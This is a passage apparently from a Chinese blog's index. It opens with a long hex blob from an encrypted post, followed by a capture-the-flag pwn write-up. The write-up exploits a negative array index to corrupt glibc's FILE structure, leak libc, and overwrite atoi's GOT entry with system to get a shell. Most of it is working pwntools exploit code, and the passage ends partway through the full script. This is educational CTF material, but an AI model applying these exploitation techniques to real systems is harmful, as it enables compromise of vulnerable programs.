fae881ca5dd205476aa4615e18b7bc59ec99d37879ce482b235eff28c6bd97c6b173bb7d24c2398c28ed4aa7a83cc9c427d262fa550a3d3ee63bcd6a609c570069f378256bd6ae34d53742f0c04cc3e5d4a5bdc8df97972ed5b788c0a3025eff1002d1b2afdcd408c22d31c1d0c6ffcb246966806fa26b8ad5d41c21e4ef2215e4661cbc901ea656e5be84ab83607de4187c47933f7f3110ee19d92e3d1d258db255b62f51f597c80d1c7d20a4b56ffe6defa9361a9a46b51f59b3097e48c9974bc580c672193044346156668f78f47ca39dea80bd4a8bb10695c60ae1ed167aacf29257a301ffb846a25a8cc32b233a698b6de7596cf4b0af27be38bda2290fd13640750f93e56dfbd48c7448048e30488d8922b911b6a97557b9f8e846e0b2b57693e8a59ea96786bedcef8fb9073ae09d1a30fe3dda9cad88ad2ff1844b52167ec4f05d40ac920512d89944f66e1bcf404c6aa0f6c9d25cb0b1b3bbf6c8f7eb3d73db9db7fb27e7360da8317d0656b4f473b244d5bf9670ab3a7b891a884adbe18a2eaa583997995af08ae05d604059d14f60607d98a20a376871506f98b2f1b1990440ae638439112c9f2790e3a5de3aede79975e46ae061f26b81b87b8e901d8dc1eafa901d0862a415d81635cc9930af5b2b2c3ebd0144b216a7b11cf2d58f37ecac1ba63a1539b7940e4478bcec3e9284162972e49240eed0ccd806c10feab859392c26e69373155a49120b55a5022ad5aefbc56f847aac47cf4e72de0cb52317ef312479e24b7acdd2e604e66ac13dd553abba2004cfc535fccec3eb8cda4c106b39b565bcd83ff27fcf60faf0099110cd339c10983834126d2f561e0212dc75b626276786721663b85c53f8352d01bf0a33b4b9e96ec01c2ed7cbc60d5dd53a829231504d9719fa12e061adbb5c291677af798f0985dc16127977a3016ae20a6f69e4bc5cb11692e032fc91c8f32107ddf053b13daa64106b67b503d0e7bc5c68deaf026e8f5da253fb1b52a19bf70ba8df44ac00a9cffc42577cf955333d1581bb353b0e6f1b399a6f4d6fcd2029c6b50ef50c3888febd4a97f09a54e1f9c36a2edb86dd5734816ea3f41616af89e056d90444d2e6b29c9fd4a1c0c3e14edcc30866ed466c1683d3a77a2bed47b9a6f3b914fd8442e38f185882c25fc38afc271c60b7972b93d85ae48908179350db015a05fe1382e036170b22e9f3f8b041e5da18499d8c51c15abadd00b0e1b4885a83961687eb8c8c5bda7516c523cf5493593a4167139a9747e219e6fffdada4dd44ee6af21d5630bf1cd7d02ee3a20271bbc6473a4469595058e1cc90e4a2f46841a8a9fd337b932029d94a5de1bbd1e8ea989a76563c7e3a0f131108139205908bd2da7cdf49210f611bc4f9e845389ba256b6b99bebe6e7fb2a5390eaa1424454714f0ce09eca0f01f1b47de71c846944c7b2b9c88bf4dd9d55993e63aabd2087c36eab42894f3343b4bf017d9d95c8db863ad655988b15140c4d1b5b3d002d2e5903d4f0cd8316f1b35fe6e432c2a34e6e3aa0633675fd5c31119ee5d0168407dde3f1f65f34a7688bde2e12289adbb0f23f500cb64713025dfa3c2f46c8afc8893d692b92750dc0358dfba91fbf9f47db92326c6eae12c7fcc0a9c0d29e567a7dd1d19408c92248f4cb2dc16b399df0b454495677aaca71515e9c9ba51f148f1f88b933661f8fca4ff600df6642ba92640356e4a8ba26c4cfbc0520869b655924bcf2b820a830bb425a5d06a7aefbc8b871cf82ca209e61e05b7c61d254410b5d88f08eeea0fb5e2a1d77af90f18d47a6b351c873fa0477362c86d75dd2d24b1fe0d7498c73ce5228f9b872a56850ab93eac16111cf7c21ed7fbddf3dcad0788827bc6e31fd992376f0d3ebfc6d29c4a63c1d5c89e410d655cd009f2889939db1f4f4c8d3f9043082461f851e4b2c43f73ad9940f3f3ef9b9d5f82047e6b7e91f7d1083ee33b8c9ffc88390d1b13914c1724aabcb95d53eb924addfddb3b512b7462e940d005a758b93927110218980cd951ec9cf6c0d19415998817c70008ee7294fed5bb610369143ebfb32b49b2efbf4e4e604372a031fbb19bfb52ef355290794bf7f1109b6b65b45ca15a2203809d31c5417581496cc96089e1307e65fd6d167ccd2d420c4e535ad92658784d89f047784a0198ae3ba1b661afcccd3059be113ed667c53c0f9c19f1bb473278b1e9e57fe0aa54164e872e53d5727467cb0009820dbe2708849ad357ff5a3145b728efd2fb566bfbef5a8a3dcf9b758272f26d497c1d209f6cf7fbff8c34d7217f9ce0ef96104085a70afa0d7b0f3a2d42a72f4b0429834927eeaa9d817d0010f64304287c3eb8179954ecb7c85549c81e4e6dd9e3cb83102f62adc4cae10bd34f54ea2e7c193429c43c46a7a4e9a13796ff7f88f4b6ae55b00df33a030037bd64ce3b602cea994937bd46e3fb618a7373b87b5564b28e1efceeb119cb4e70071c3e4c4eedc8e38d4183eeb12c2ac0a62ed5277d15de8623634e27b42bd01a6b3990058425312fcf8bc09f2273f090d030138db2753461bd1239c74906f6f1b84612e9cb29a83d0e6ac81b8ccee4fad4104dd022f40409d97d60682ba214df9e5781ac4ea410417b7b53dd096fc843a3a71a68a4b10ab64f1db04ac39ee6fd0933131a7e9bcf73b05d15a36ebb2f992c58a8e9f69bfc6d667da831ed6b82bfe2049ef76fc5815cd3f129bddabf3040f7cc84fb7d93ac6ead44b03bacbd51eeaaa84bf1027f2f98cd3850523e39304954387676eec76b34ded0cfedbbf60625e74f850571696ed1104fb41bbf33300c7b48477c1828ea11ea309f7f9b54e431b202e067e1538432c79d93f7fe9ed69b0ac1116a0933f7f067e0abcf057b59326577940b50dba5ad317602d5e29b735ece503305716ab54138452910a43b52b23d417e85fe9aab97fe4790acf6e04e3ee0f30157945d01a39052c48e157867d2e6401bfdc1108bdcffce40222bf3e72aa6b5e2d57ca19be1b3f824d57b9ed75a9acdadef2370e1bd70408bb2d3d538d590a1f94b64dabca116da053d8a2717615a1617db6083aafb28b82e350811b122f2af58eff0d3ab8178228ecbe7b08f637b45dab0ce737c527e8b7ef0ce99fa12ced89df31b593e568bf85ff88f51877a4012cd9dc183bbe0c47328be0001753746999c04aa139ef99252eb23ab44fc2e7c3eea722a6804da0bd4a33c53ed88201283bf19f35948be12775f44dc5baf84327cfe179acb5ab38ac4274c7af3f98f57413413bcdc21cc8fe28584d04e9a94379f4d4ad44b292ed5a56148432aeddc1d13b58813f355cbb802fa327ead124765bde0d900e25669ab13a930b589b6d6b0c141f549cc8270540866a3420bd7f63253b2eeb399a31572ae192158d2333d1474ba0f3530cac77c4e238faae21e509f1e1cb847e55025947f666a11cddc2da9caffea36ba5bc32e8b7adc526d37c047efbd9ce3984ff71bf5b4bd2a0852e45c7b78a4cf5f9b83ccba492b321c05ad591db0af16470e3df95af263a18bf2dfdf48083b6f5abf9266d1b988b380003394ade6486ba8b1051d6c4f1fd8d2710376077a2a1603564a368a5b1d6a622149d12f480222a0396fb10bbeecaaf02c8b69b899f3d6bf542089c0c60b56764008c69852dfef6f04a4bbfd62b8a76bdc700b2e416662d7466aa27e7e47b6a6e5e6eef155ad64201ae7c30a23458017e527b971ac89d3b6ef35bd2feb607b8a109f2e215f419aa5dc6f4e6875dfb82d34565b78318ec2841d6e773862057ac5089b01af8bd0af38faa3b1092d371d1f17110dbe6b85653b076532f19f3e570dbbeccb203c9d8bcdcb5cb49fa0e5d87613ba2db8038ec365e22b98d552ddac455d6704cdf690f2700ed05aee74b3527b9a2d5c66f31f604dc81d0ab3a2ebaf1a9312e7faa92d1f79e63d1671462ac1cccfb640f28a71cb64dccdd938c149875c1186b7f9f0f65f354375d1a72ec02d13a10a54f4e15e732da0363c3f87a0ffce38b27eb6b03bfe642b93e64e17a456819f1690e0c72cc0ec1dbd0e6593cfd0e8fad3dd81bc87e09650a319c9f50a0537763b82e66b139c6e9368960a342af8ba8866b28196ccd08df140f240d7dcf127ba87fd8000eab343a5c3bd7fd415d8defa2333351bb13f0939e75a0806d993f5bb39c10705ce2f5f195960c18990eacc328d6582ae054b2ff89a0a510b97a9d043173164a09d9171573ecfcb23cc34fb13ef6c5bb2bc74b2408caaf63a4c07fcaf5709a7e39c55f01d73cf930b5afe71effea24a6e6a2cbe0ee56c843d48121c392640121db66b3e4c94e3c238c4e06f479f610270784f82bdd78ec3dd2ef20d7f012748ae3225f7ec75f470b51c493552bb8f6317bf8b9fc83d8437eed7a47e0c31a9d6a2d3b0098ac3b0497bc0f3431684b2f3b767559d0b1bedc4606ae7209d240266515f24012cc3aee41e7a3a1dc0b84e818f85d6cc36c8c2c91d4aee018ab9bccacb46578e5477a69c3db2e9b42c238e15866b868e54f67247deb5adc4518a743a9692481884ce506647d67c0a52c6c7736963d87167d8ed21a9fe57f395da60afe0cd294542b7923057d5dc09532115695d40bc9362a7ea5e5e251f5ca7245188586584f61f49d4de9b96c950a7de2547e184be856f3d95f0c4baf9c90c9ed90c2e62492a1deac2ee3f2d419043b568f312bd782eee243a60a690d0ee6b622af72eff4479c7986ef7646c9bbb6d14981e11d8091966c3ab07642ef9cf971f8860bbc5b30b1e462fd924ea6173d914e9777ab0e91bc22fd30e216ae2e9864ea075f0cedad4e86e8604c72376e93825769303bf7d3c7d51c65617977765ded00b401ea6ff3e740d18e77a8a306a23ed19ca3d92de0e45ab3c35dcdbe2dbd26270a7dea7c65a2a3dca52f566ac5533fc63602fcbcfcb4a26a16da64c416cca6b22ce8f9e003acfef2292fa6516f2a43dd503872523a2f58fbe3de468cae625664a81a10aeb6d7c42343d0b665e074fda8c1815d853e9303c889407cb248444b71269b79b9975638dd180836c5e90ed2b05d95c5814025ac4dff4e82f48beb4e7c20c2fb2c86c159bb874296d14e1aaffcda7cee9ab513ebd749b7b4e235345dba2e171e2537e1d720a231e42fa06625bff918c5ec9c894458bbf0ada0e81d885c222a1db64fa40e2ea51335bbf3fe14aae0dfd81d54bbf70cf1f2f6fc9fbd4a44c048fdb669ffaab6eda840bcf809c213840e3c3eb64acf1d0b851107651e0e029c2e40a19b38fb6558b282b0e14f9f96a21b8eef0b220c93c1e8f16250b0a7ba950b89786e75a4cec46bb77ef23e687abc59d1c0055513e181fd1a1a9eda607a216ed08ae2f9be8b59c523adfdc00856fad5be6b4ba28c4811326e4132c6175b8cdf8b8cc89a68799053b7fe2850c950071af83aada9bc18233aad73d812b3d87c4752cdaee0648f8cf1d1756af6a5807e9d24e506154149e34de0b2974e6062ba77fd3b5a9fffd9b069582ed156b2d0ee4d74a61b50069ab2b0dee960b506f6d502bcb415566c8913ebdb22eb208db4be73e3d262e8e21a44adefeb5989245b77733ab4ad9257d3b99995f6f492f73136db66ce0509591f61eb8bc4087a6f4016825231aadc5521caf34ee9cd33e0afaf249ef607fa4e2feab69d90ed05e3fe179216c169906f8982cd40a03febf373ad8b82aa0062a3d383132ac1f137508ba57d928e30f291eb3020b533a46391f5d6b757b2d1a423af5d53c5ec37a72fa872fb1f5c728ce91c8b3006006a741c4937491ea9f46b6287c52ece3b1da95ddde6236fe5723818233b0c1754fc6ed2ea44ea95031b5a81d468ccc79fac5cb502a94283ea4c3049177f98360806c17522e2a6d2119bce399ef7b64481eebe123f9e7f223437d75bc352e4b387ff978395a69933b63f39492ccb44771e74de4fc7a5c3a7b5da90c03f93282bc38a02de7a986b34bf1fde8347ae60c6481bf0533b903d1013d6a99ee98cfeb2acbfe844aa2afc4aa9ae67e34915deeb363617f9e65f10523fb3c5efac63cbdb36457c2a5c3ba2de7592dbca3a1b118b7aef34c737ad65f4fa5a503272e028eb28131be5f1abd014731372db7eae45e91a51903a7abe33965ac00bcb834511a7a3a9b3e2ea1c20cb4d0c69e6672d23158671f0a4f614c6dcc1585cd85164dbee12f2f52a977c93e3ace8a98d462ad0a37e60af0db50d22a043e6c9a155ee5f0842a17015561cd26d1555fe6356a06c979bab8172f73906ef79f308b9f21ee035ff4929f1e49f7cfe175f334088f92581600a381da1cf2739544b0a6bb5641f21a1a00a824222475f4551839baf2caee54ef3e1994cecfba8a21bdd3d036d8ab81945a92145a0aa0b03932b4299160741feecba87cc2db8bd81842e511cd2551d9ce3ea70bdb295a9c721be0b1b850c303b6c10d35cbb6f8ae62079d031dd7cc5f593511a456570a5b2915791948f776e1761967b07aa630a3b5d027e283df8aeaf79e1930762dfcd4f850ec9c9aad6a02bbeb6adbed8b447e44e9d4e9153dcd1a42d9d90faa08ee39015d2103c2636fe860ec351bc7f0d36037647dcf44778a1ad8817f3ed7663662fed9f86aa52f4dd2f6e7ae2b9df383312e2f2d73a5b2357ab797858cbae337619f0b8b24d2fb72633cb5bbfa36f0360e0fa362d86fbe1544e2f4050209a8692c8b84e887d1fc8419d2d8fbf5ef13fb6053a367daa1f317fd884a89366dbdc7114e9ae8c0ebc37da9e0423ee4771fe8cbbf47f6f4c06b56c357aad83683dfac7f64547333449645c0af5cde15099f422f6a537849ec65a7d9ff371143e1cf526ea826b07dd79ace818a34d49ea52bf8278bdbf7e90afb6439e7990484b4bda3c87c3a05317b52511f1db12bd70d24f3e2022b2f3b4ea8669643706e93e537d9eb627cbd7ed78b1fec2c5614b87136ec714595368d4689a704548fcaf0425a39874e68135c8d58d78504dc2c5e80070bacb1c0554dea4ad2cd84d91e57b45598856bad2fba11fdeafcc429330cfdd5aa53f47cad007360b9fd9992d62920050e6cbcb012b02e51e04352349b0880f5d1e8c5f35c58e3a02d273e78de87f926f13f9f864e71e911264bb777aa82bbf49f470042ca8c9d5e9477e84b5e2385658f886bf1bcc8e776ec321e0ae23ce2a9af617bbb8c91f0341a6c7085b804501f9e97b74797c07b750faa3225595e91f74a449871eda8a6c7da8ad69412d701a0b606b6e75159bfa8e9099b7a4aba3714c45310cb5c42e8fba174efbb723b5bfb848f3b672062446088b663e6a69b9d575732f98a8ef13654d16ea09f7effa6f586fee65dc5791f6200be864c82c59b3eea3141d2f48c603cf339a7b7f56763ebf97343951479001adbfdffff445e918421dba1a9e251eb1d69eb982007367e62c7f777b5e4db6e35c6f28df9097c6e6268d8760df5f61a6a94aeaa58d8968bd36740e819dbb4d064a37b9e3ad433e0f1705e801f9d00f35dbcd3ee01eb840aa39faccb65d8fdcc4b8dfa9bddc030855528bda50c99d976a83bf6e2525174e5f2355ef47332f560ca67e49d43a3e49afaffa623f4219ee9819a79c4b1121cf90af89bed651a1cbff791ba17c01ea61701b779666d7ce59357896c9db785cd3d667994591267d78095c5744a7f5ab4e4b37ae078a9ab29ba16c3ffc1471e11d0656834d8a3c7ea3c57ecd9605526bd3eddcb8ead149566bbd997ad117d86ffa6f5ca60e4fce4f7450decdc41f87e4506074063cae00300805502ce274b12c7701a509e1de54d93d1bc74d3289fed4be63536c3d9bef5157e8329ce9beec8e17b22828eb1440284630eba178c0a0a2c454145801102cae5a050364814f1ad73c6c16aca217b12ca6bc31994b6aaea6fb7f79fffc146cd84631cf1c928fc08f58be3a62981f785c132a5d70ad4b0ed4e3c26323b1b1b63f167b863d109c575c62b0520142c0b78c2cdce6ff3c5a4d3e32136447d2f347fb7655c3837aa26a2665e09a75d8cfecb9d669c9ac0158b3eeeee9fff8bf65b050551b6c28ca021634e3d42816eb0110c642c9e1fae8e37b2c3f5cecbc7e741110567f169e27c1276137174b820a1a43b8ff56f726a5c5f20842636cecaff76498460969c5e0b36e2ee698cf2a706fbaf375be3163367d2c3fa47f168150c2147812d9d7457739f10e140bfca1786404e57c1c07463d7950c67a1167e17db4ab97f1c772189b05a962201de0ab0a6d6b6763ce4a99c22305c64011ae5b5341da9c6566de661294b3e33c630078c9358a37ce1102d82591028f4cb4b045c5c48e3f7246c4ffdeea8d3a1b606e954137f196faa43966d5d374d95caf700c12cc5c77ffe65c09fbeb2857760723b1dd05a254cf8a8b4b663504f37d951aae7f1ae13e363bf86dc5d1b95a84df4496c342d8fc80600f0b46231cb30425b87b46e49268ac2b040daae9c62bdebca9a4163e3e21b09ed5eaae45a1e48e0482f9a903fb32bba8981652e010872b86bd44f3b8c363407c23fa80ed523d04711c13c8f88f5fe168c1358dbd15d9da5959c5438fc0d3062ef09904b0e1b1a9a8b0695e424bd71575205a1d81cde579fe3e53f6f577844ec32decaf7edde192c9afcafe5098c57c48c8fc28f0871027fd05cced6261ceee5f5b5197ca1a171059eddb004b6be17300bc5b23aee9467b825e8076666d0532813c238d0f901ae7b70abbd326725d204a762963d6ddfefc8ec5bfbda9c6d6edf7a4c62b55f21ebf97962c5e555061d3165d8669c6f08dde157750e5920079d2586f68522e6354e4c9af51c19269a8988cfb941859af80ca3bac22ccd7f817d79c3ae096605110f405725aaf1dbd9a37016a86602c33acc1c6b277b6600bc9ed09befa52d7a396faf7bda03fc066ae65825ff27f054eb00707f85ea46afff7e148b68f37450993916e73ca3f0577c53fb03b57edd5f927d1546afc6be58fd2a0ee9c078981e34990ce4974d140b4bdc8382bb99fe64df824eb2627f800bbcb2c58afff27d45aa2304faa5f6a59dc53d06b6f23200d980956ca2ca6028e452c3f7552a46639c89ff77c1f02cefa71afa95937331174403bb5d83531d4d109e3fadbb8fd0e36c901e74ae533db758dae0ecc2cc11922b17be04a15edd9ffeefbb5667adf8a5f7d69f375600f54eb3bd7b4f88428d0a12c7a32e179932f6cdae6f6bc18e2c0fdf7b64d88582957906c09a51823ddfce448b56579f975775b21900f59a9ceb0fb51c6500e58d47331c5593f1d12c79db761ef343f0fd481a6d549aca35fbfc4c8236cb78d38d0c01935531abab1b5acf26f10560a21e1fd02e3939a497b441e464dc3f24e384f214a4ab591c7c578b8f17f6b1064457d5c48385fd369868b946b9f1c00ccc0bc22c6bd80aa00d6f7510209621c21acdc2f424566a77e14c7e4fa934a9dcfb31bca5d96c80a65f1f6f49ddeb9b42d3f296361043d499a697cd9b0397b5cd898a4bc6ba502b15d4270b3561eb173723439bca07598f180b42e99e9d1578fae671801f80c0be3d7d7e9e35be7c15f9ba7b8ad1ec693d62350272e5696a6c220f04e4388d32db14153d5f5145b8bbbf2f4fb9cbbf59ae0f2683b1567a05dfac6547d292dfe58d1ae67356ce59a42f4c3a484417650e7871f227af202fdffd81b62bc96d96b78b2a4b748f9308b09f2bf80a4c46bc\n  \n    \n      \n      \n        请输入密码查看\n      \n    \n  \n\n","categories":["安全研究"],"tags":["Apple","T2"]},{"title":"magic","url":"/2019/11/10/magic/","content":"首先，检查一下程序的保护机制，发现PIE和RELRO没有开启，或许我们可以很方便的修改GOT表\n\n\n然后，我们用IDA分析一下，发现wizard_spell函数存在**[数组下标向负数越界的漏洞]{.mark}**\n\n\n然后是create函数\n\n\n然后，我们用IDA调试一下，发现wizards[-2]处就是log_file的地址，而这句可以修改FILE结构体的第40字节处的数据。\n\n\n让我们先来看看log_file的结构体内容\n\n\n偏移40字节处是_IO_write_ptr，而_IO_write_ptr是缓冲区的地址，下一次写数据时,如果_IO_write_ptr与_IO_write_end不相等，那么就会往_IO_write_ptr指向的区域写数据，而程序正好能够修改这里的内容，那么，我们把它修改，让它指向log_file结构体本身，那么我们就能修改整个log_file结构体，修改_IO_read_ptr和_IO_read_end，这样read时，就能泄露地址信息，然后将_IO_write_ptr指向目标地址，写目标地址，比如修改got表。\n显然，当前_IO_write_ptr为0，缓冲区还未初始化，因此，我们需要先调用create来初始化一下\n#这两步是为了初始化FILE的结构体  create()  WizardSpell(0,&#x27;seaase&#x27;)  \n\n然后，我们再看一下结构体中的内容\n\n\n我们看到，缓冲区已经初始化了，现在我们就要开始攻击了\n#修改log_file结构体的_IO_write_ptr  for i in range(8):     #_IO_write_ptr = _IO_write_ptr + 1 - 50     WizardSpell(-2,&#x27;\\x00&#x27;)    #在不影响log_file结构体的情况下，我们抬升_IO_write_ptr 13个字节，然后再-=50  WizardSpell(-2,&#x27;\\x00&#x27;*13)    for i in range(3):     #_IO_write_ptr = _IO_write_ptr + 1 - 50     WizardSpell(-2,&#x27;\\x00&#x27;)    #在不影响log_file结构体的情况下，我们抬升_IO_write_ptr 9个字节，然后再-=50  WizardSpell(-2,&#x27;\\x00&#x27;*9)  WizardSpell(-2,&#x27;\\x00&#x27;)  \n\n在修改时，要注意不要破坏其他地方的数据，因此，上述的各个内容，都是在调试后确定的。比如，我们每调用一次WizardSpell(-2,’x00’)，_IO_write_ptr &#x3D; _IO_write_ptr + 1 – 50，而WizardSpell(-2,’x00’*13)，_IO_write_ptr &#x3D; _IO_write_ptr + 13 – 50也就是说，内容的长度可以抬高_IO_write_ptr\nGlibc中的源码是这样的\n\n\n经过上面的操作，现在_IO_write_ptr就指向了log_file的结构体附近处，我们就可以改写log_file的结构体了。为了泄露地址信息，我们需要改写_IO_read_ptr 和_IO_read_end，\n#现在，_IO_write_base指向了log_file的结构体附近处，我们可以修改log_file的结构体了  payload = &#x27;\\x00&#x27; * 3 + p64(0x231)  #flags  payload += p64(0xFBAD24A8)  WizardSpell(0,payload)  #_IO_read_ptr  _IO_read_end  payload = p64(atoi_got) + p64(atoi_got+0x100)  WizardSpell(0,payload)  atoi_addr = u64(sh.recv(8))  print hex(atoi_addr)    libc = LibcSearcher(&#x27;atoi&#x27;,atoi_addr)  libc_base = atoi_addr - libc.dump(&#x27;atoi&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  \n\n请注意红色部分，我们用的是WizardSpell(0,payload)而不是WizardSpell(-2,payload)，这是因为WizardSpell(-2,payload)会使得_IO_write_ptr – 50，这样，_IO_write_ptr就会指向上面的不可写的段，使得我们不能第二次利用。而WizardSpell(0,payload) 只会把_IO_write_ptr+&#x3D; len(payload)，而不会让_IO_write_ptr再减去50.因为被减50的是结构体0对应的第40个字节处的数据。\n\n\n现在，我们得到了需要的地址信息，我们要开始攻击atoi的GOT表了，我们想把_IO_write_ptr指向atoi的GOT表，于是，我们尝试这样修改结构体\npayload = p64(atoi_got) * 3 + p64(atoi_got + 8)  WizardSpell(0,payload)  \n\n然后，我们看看结FILE构体的内容\n\n\n发现，除了**[_IO_write_ptr没有成功修改，其他都改了。这是怎么回事？]{.mark}**\n我们用IDA跟踪fwrite函数，发现程序最终会调用_IO_new_file_xsputn函数，然后，我们跟进_IO_new_file_xsputn函数，发现，这一句代码改变了_IO_write_ptr的值\n\n\n对应的汇编代码\n\n\n然后，我们去看看libc的源码，对照一下，发现\n\n\n经过调试，发现图中的loc_7FA3926C73B0就是__memcpy，它返回值rax为复制后的结尾指针，比如，p&#x3D;xxx，那么__memcpy(p,s,count)就是返回的p + count，因此, _IO_write_ptr再一次被覆盖，变回了原来的正常情况地址。\n[由此，我们不能通过fwrite来对_IO_write_ptr做修改，我们应该借助fread来修_IO_write_ptr。我总结了一下，如果是read操作，我们可以修改write相关的指针，如果是write操作，我们可以修改read相关指针。]{.mark}\n由于程序在fwrite后接着就调用fread，所以，我们**[利用fread来修改_IO_write_ptr]{.mark}**\n\n\n我们还是来分析一下fread的源码，经过跟踪，发现fread最终会调用**_IO_new_file_underflow**函数，然后，我们分析一下_IO_new_file_underflow函数\nint  _IO_new_file_underflow (_IO_FILE *fp)  &#123;    _IO_ssize_t count;  #if 0    /* SysV does not make this test; take it out for compatibility */    if (fp-&gt;_flags &amp; _IO_EOF_SEEN)      return (EOF);  #endif      if (fp-&gt;_flags &amp; _IO_NO_READS)      &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return EOF;      &#125;    if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)      return *(unsigned char *) fp-&gt;_IO_read_ptr;      if (fp-&gt;_IO_buf_base == NULL)      &#123;        /* Maybe we already have a push back pointer.  */        if (fp-&gt;_IO_save_base != NULL)      &#123;        free (fp-&gt;_IO_save_base);        fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;      &#125;        _IO_doallocbuf (fp);      &#125;      /* Flush all line buffered files before reading. */    /* FIXME This can/should be moved to genops ?? */    if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))      &#123;  #if 0        _IO_flush_all_linebuffered ();  #else        /* We used to flush all line-buffered stream.  This really isn&#x27;t      required by any standard.  My recollection is that      traditional Unix systems did this for stdout.  stderr better      not be line buffered.  So we do just that here      explicitly.  --drepper */        _IO_acquire_lock (_IO_stdout);          if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))        == (_IO_LINKED | _IO_LINE_BUF))      _IO_OVERFLOW (_IO_stdout, EOF);          _IO_release_lock (_IO_stdout);  #endif      &#125;      _IO_switch_to_get_mode (fp);      /* This is very tricky. We have to adjust those      pointers before we call _IO_SYSREAD () since      we may longjump () out while waiting for      input. Those pointers may be screwed up. H.J. */    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end      = fp-&gt;_IO_buf_base;      count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,                 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);    if (count &lt;= 0)      &#123;        if (count == 0)      fp-&gt;_flags |= _IO_EOF_SEEN;        else      fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;    &#125;    fp-&gt;_IO_read_end += count;    if (count == 0)      &#123;        /* If a stream is read to EOF, the calling application may switch active      handles.  As a result, our offset cache would no longer be valid, so      unset it.  */        fp-&gt;_offset = _IO_pos_BAD;        return EOF;      &#125;    if (fp-&gt;_offset != _IO_pos_BAD)      _IO_pos_adjust (fp-&gt;_offset, count);    return *(unsigned char *) fp-&gt;_IO_read_ptr;  &#125;  \n\n首先，上面17、18行我们看到，如果fp-&gt;_IO_read_ptr小于fp-&gt;_IO_read_end，就会直接返回，因此，我们在fwrite时，应该伪造fp-&gt;_IO_read_ptr和fp-&gt;_IO_read_end，使得条件不满足，继续向下执行，就会来到59、60、61行，这里有对fp-&gt;_IO_write_ptr赋值，并且其值为_IO_buf_base，因此，[在fwrite时，还应该伪造_IO_buf_base为我们攻击的目标地址。]{.mark}\n为了能覆盖到_IO_buf_base,首先，我们需要保证_IO_write_ptr小于_IO_write_end，因此，我们，因此，我们让_IO_write_end比_IO_write_ptr大一些，至于大多少，反正要保证_IO_buf_base的地址坐落在[_IO_write_ptr, _IO_write_end]，因此，我们随便选一个，我这里选的是0x100。当然，我们需要知道_IO_write_ptr的值，由此，我们还需要泄露FILE结构体本身的地址\n#回到之前的位置  WizardSpell(-2, p64(0) + p64(0))  #重新写  WizardSpell(0, &#x27;\\x00&#x27; * 2 + p64(0x231) + p64(0xfbad24a8))  #当执行fread后，要求_IO_read_ptr大于等于_IO_read_end，经过调试，发现输出以后，发现0x50正好  WizardSpell(0, p64(log_addr) + p64(log_addr + 0x50) + p64(log_addr))  #泄露log_file结构体的地址  heap_addr = u64(sh.recvn(8)) - 0x10  print &#x27;heap addr:&#x27;,hex(heap_addr)  \n\n注意，上面，我们WizardSpell(-2, p64(0) + p64(0))而不是WizardSpell(0, p64(0) + p64(0))，这是因为，用-2，使得_IO_write_ptr重新回到前面，这样，我们又可以覆盖_IO_read_ptr和_IO_read_end，并且，[我们设置_IO_read_ptr &#x3D; log_addr , _IO_read_end &#x3D; log_addr + 0x50，这个0x50可以不用精确，只需要保证，经过二轮fread后，_IO_read_ptr大于等于_IO_read_end，这样，第三轮fread时，就可以修改_IO_write_ptr。]{.mark}\n第一轮，我们覆盖了_IO_read_ptr和_IO_read_end，用于泄露结构体本身的地址\n第二轮，我们要修改_IO_write_end\n#修改_IO_write_end  WizardSpell(0,p64(heap_addr + 0x100)*3)  ```  第三轮，现在_IO_read_ptr大于等于_IO_read_end，并且_IO_write_ptr指向了_IO_buf_base，那么，我们覆盖_IO_buf_base和_IO_buf_end```Python#覆盖_IO_buf_base和_IO_buf_end  #然后程序中执行fread就会修改_IO_write_ptr为_IO_buf_base  WizardSpell(0,p64(atoi_got+0x78 + 23) + p64(atoi_got + 0xA00)) \n\n这里，我们不直接覆盖为atoi_got，而是向下偏移一些，是因为fread时\n\n\n所有指针都设置为_IO_buf_base的值，使得_IO_write_end - _IO_write_ptr &#x3D;&#x3D; 0，不满足_IO_write_ptr小于等于_IO_write_end，fwrite时，就不会写入数据。而我们向下偏移一些地址，然后我们用WizardSpell(-2,’x00’)操作，可以让_IO_write_ptr -&#x3D; 49\n现在，我们就操作一下，让_IO_write_ptr指向atoi的GOT\n#  WizardSpell(-2,&#x27;\\x00&#x27;)  WizardSpell(-2,&#x27;\\x00&#x27;*3)  WizardSpell(-2,&#x27;\\x00&#x27;*3)  \n\n**[注意，每次操作，_IO_write_ptr指向了新地方，如果这个地方的数据是有用的，不要破坏它，因此’x00’，’x00’3这些都是我调试后确定的，具体也可以动手调试看看。]{.mark}*\n现在，_IO_write_ptr指向了atoi的GOT-1处，我们就可以修改atoi的GOT为system地址，拿shell\npayload = &#x27;\\x00&#x27; + p64(system_addr)  WizardSpell(0,payload)  #getshell  sh.sendlineafter(&#x27;choice&gt;&gt; &#x27;,&#x27;sh&#x27;)  ```  综上，我们的exp脚本```Python#coding:utf8  from pwn import *  from LibcSearcher import *    sh = process(&#x27;./pwnh36&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,41210)  elf = ELF(&#x27;./pwnh36&#x27;)  atoi_got = elf.got[&#x27;atoi&#x27;]  log_addr = elf.symbols[&#x27;log_file&#x27;]    def create():     sh.sendlineafter(&#x27;choice&gt;&gt; &#x27;,&#x27;1&#x27;)     sh.sendlineafter(&quot;Give me the wizard&#x27;s name:&quot;,&quot;seaase&quot;)    def WizardSpell(index,content):     sh.sendlineafter(&#x27;choice&gt;&gt; &#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Who will spell:&#x27;,str(index))     sh.sendafter(&#x27;Spell name:&#x27;,content)    #这两步是为了初始化FILE的结构体  create()  WizardSpell(0,&#x27;seaase&#x27;)  #修改log_file结构体的_IO_write_base  for i in range(8):     #_IO_write_base = _IO_write_base + 1 - 50     WizardSpell(-2,&#x27;\\x00&#x27;)    